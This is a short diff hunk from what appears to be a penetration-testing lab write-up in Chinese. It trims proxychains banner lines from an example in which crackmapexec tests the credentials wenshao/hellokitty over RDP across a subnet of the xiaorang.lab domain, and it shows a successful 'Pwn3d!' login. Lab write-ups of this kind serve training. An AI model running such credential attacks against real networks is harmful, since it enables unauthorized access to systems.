@@ -325,9 +325,6 @@ crackmapexec 跑 rdp
 
 ```shell
 $ proxychains crackmapexec rdp 172.22.6.0/24 -u wenshao -p hellokitty -d xiaorang.lab
-[proxychains] config file found: /usr/local/etc/proxychains.conf
-[proxychains] preloading /usr/local/lib/libproxychains4.dylib
-[proxychains] DLL init: proxychains-ng 4.16-git-13-g133e06b
 RDP         172.22.6.25     3389   WIN2019          [*] Windows 10 or Windows Server 2016 Build 17763 (name:WIN2019) (domain:xiaorang.lab) (nla:True)
 RDP         172.22.6.12     3389   DC-PROGAME       [*] Windows 10 or Windows Server 2016 Build 14393 (name:DC-PROGAME) (domain:xiaorang.lab) (nla:True)
 RDP         172.22.6.25     3389   WIN2019          [+] xiaorang.lab\wenshao:hellokitty (Pwn3d!)
